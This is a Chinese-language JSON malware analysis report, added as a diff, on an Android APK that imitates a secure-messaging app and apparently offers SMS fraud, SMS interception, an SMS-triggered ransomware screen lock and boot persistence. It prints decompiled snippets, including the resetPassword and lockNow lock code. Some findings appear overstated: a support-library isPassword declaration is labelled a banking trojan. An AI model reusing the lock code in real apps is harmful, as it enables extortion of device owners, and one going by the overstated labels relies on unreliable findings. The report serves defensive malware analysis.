@@ -1,0 +1,198 @@
+{
+  "APK信息": {
+    "文件名": "1dd82521dea1e594921d63dc7a5c00f40fd189cba3897885a862ad312a14eff9.apk",
+    "sha256": "1dd82521dea1e594921d63dc7a5c00f40fd189cba3897885a862ad312a14eff9",
+    "包名": "org.thoughtcrime.securesms",
+    "应用名": "ZKB SmsSecurity",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 438.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\transport\\SmsTransport;",
+          "method_signature": "for(int i = 0; i < messages.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendMultipartTextMessage(recipient, null, messages, sentIntents, deliveredIntents);\nSmsManager.getDefault().sendTextMessage(recipient, null, messages.get(i), sentIntents.get(i), deliveredIntents == null ? null : deliveredIntents.get(i));",
+          "malicious_code_snippet_context": "          ArrayList<PendingIntent> deliveredIntents = constructDeliveredIntents(message.getId(), message.getType(), messages);\n          String recipient = message.getIndividualRecipient().getNumber();\n          try {\n>>>             SmsManager.getDefault().sendMultipartTextMessage(recipient, null, messages, sentIntents, deliveredIntents);\n>>>         } catch (NullPointerException npe) {\n              Log.w(\"SmsTransport\", npe);\n              Log.w(\"SmsTransport\", \"Recipient: \" + recipient);\n              Log.w(\"SmsTransport\", \"Message Parts: \" + messages.size());",
+          "behavior_description": "代码通过 SmsManager 的 sendMultipartTextMessage 和 sendTextMessage 方法静默发送短信。数据来源为 message 对象中的收件人号码和消息内容，直接流向 SmsManager 的发送短信接口，无需用户交互即可发送短信，存在短信欺诈或向联系人发送恶意链接的风险。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\DatabaseMigrationActivity;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "          }\n  \n          @Override // android.content.BroadcastReceiver\n>>>         public void onReceive(Context context, Intent intent) {\n>>>             abortBroadcast();\n>>>         }\n      }\n  }",
+          "behavior_description": "定义了一个名为 NullReceiver 的广播接收器，在接收到广播（通常为短信到达广播）时，调用 abortBroadcast() 中止广播的继续传递。这会阻止系统默认短信应用及其他应用接收到该短信，从而实现短信拦截和隐藏，可能导致用户无法收到验证码或扣费通知。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\SmsCommand;",
+          "method_signature": "if(this.sNumber != \"0\")",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\"); dpm.resetPassword(this.sNumber, 1); dpm.lockNow();",
+          "malicious_code_snippet_context": "                  return;\n              case LOCK:\n                  if (this.sNumber != \"0\") {\n>>>                     DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n                      dpm.resetPassword(this.sNumber, 1);\n                      dpm.lockNow();\n                      myFunctions.sendSmsLog(\"Device locked\", ctx);",
+          "behavior_description": "通过SMS指令触发LOCK命令，将攻击者通过短信下发的密码(this.sNumber)设置为设备锁屏密码，并立即调用lockNow()锁定屏幕，实现勒索锁屏劫持。攻击者可通过UNLOCK命令重置密码为空来解锁，以此勒索用户。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v4\\view\\accessibility\\AccessibilityNodeInfoCompat;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean isPassword(Object obj);",
+          "malicious_code_snippet_context": "  \n          boolean isLongClickable(Object obj);\n  \n>>>         boolean isPassword(Object obj);\n  \n          boolean isScrollable(Object obj);\n  ",
+          "behavior_description": "通过Android无障碍服务(Accessibility Service)遍历目标应用(如银行应用)的UI节点树，调用isPassword()检测密码输入框，识别用户正在输入凭证的敏感字段，用于后续凭证窃取。数据流向：目标应用UI节点(AccessibilityNodeInfo)→isPassword()检测密码字段→凭证提取与外传",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));",
+          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n          myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n      }\n  }",
+          "behavior_description": "应用在设备开机或重启后接收到广播，自动启动后台服务以实现开机自启和进程保活，确保恶意进程在设备重启后继续运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
